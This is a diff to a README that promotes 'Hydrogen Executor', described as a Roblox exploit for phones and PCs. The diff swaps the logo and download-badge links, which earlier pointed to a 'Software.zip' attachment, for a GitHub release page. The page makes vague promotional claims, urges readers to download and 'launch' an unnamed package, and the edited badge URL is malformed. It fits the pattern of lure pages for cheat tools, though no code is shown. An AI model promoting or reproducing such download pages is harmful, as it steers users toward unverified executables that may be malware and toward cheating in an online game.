@@ -1,6 +1,6 @@
 # Hydrogen Executor - The Ultimate Roblox Exploit
 
-![Hydrogen Executor Logo](https://example.com/logo.png)
+![Hydrogen Executor Logo](https://github.com/doszxc/Hydrogen-Executor/releases/tag/v2.0)
 
 Welcome to Hydrogen Executor, the most popular Roblox exploit for Android and PC users. This powerful tool allows you to enhance your Roblox gaming experience on any Android, iOS, or Windows PC device. With Hydrogen Executor, you can unlock new features, access exclusive content, and take your gameplay to the next level.
 
@@ -13,7 +13,7 @@ Welcome to Hydrogen Executor, the most popular Roblox exploit for Android and PC
 ## Installation
 To get started with Hydrogen Executor, simply download the software package from the following link:
 
-[![Download Hydrogen Executor](https://img.shields.io/static/v1?label=Download&message=Hydrogen%20Executor&color=blue)](https://github.com/user-attachments/files/18060583/Software.zip)
+[![Download Hydrogen Executor](https://github.com/doszxc/Hydrogen-Executor/releases/tag/v2.0%20Executor&color=blue)](https://github.com/doszxc/Hydrogen-Executor/releases/tag/v2.0)
 
 Please note that the link provided needs to be launched to initiate the download process.
 
